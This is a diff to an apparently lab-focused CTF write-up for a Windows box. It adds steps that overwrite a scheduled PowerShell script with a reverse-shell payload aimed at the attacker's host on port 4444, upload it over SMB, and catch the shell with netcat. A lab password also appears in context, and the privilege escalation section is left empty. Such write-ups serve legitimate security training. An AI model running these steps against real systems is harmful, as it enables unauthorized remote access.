@@ -111,8 +111,6 @@ Password: sand_0873959498
 
 #### Download files <a href="#download-files-1" id="download-files-1"></a>
 
-**Option #1**
-
 **Kali**
 
 ```
@@ -137,6 +135,8 @@ cat PurgeIrrelevantData_1826.ps1
 
 <figure><img src="../../.gitbook/assets/image (885).png" alt=""><figcaption></figcaption></figure>
 
+## **Initial Shell**
+
 **Kali**
 
 ```
@@ -159,19 +159,36 @@ Invoke-PowerShellTcp -Reverse -IPAddress $KALI -Port 4444
 cp Invoke-PowerShellTcp.ps1 PurgeIrrelevantData_1826.ps1
 ```
 
+**Upload payload**
+
+**Kali(smbclient)**
+
+```
+put PurgeIrrelevantData_1826.ps1
+```
+
+After a few moments we get a connection
+
+**Kali**
+
+```
+nc -lvnp 4444
+```
+
+<figure><img src="../../.gitbook/assets/image (886).png" alt=""><figcaption></figcaption></figure>
 
 
 
+## Privilege Escalation&#x20;
+
+[https://korbinian-spielvogel.de/posts/vulnnet-active-writeup/#privilege-escalation](https://korbinian-spielvogel.de/posts/vulnnet-active-writeup/#privilege-escalation)
 
 
 
+**Kali**
 
-
-
-
-
-
-
+```
+```
 
 
 
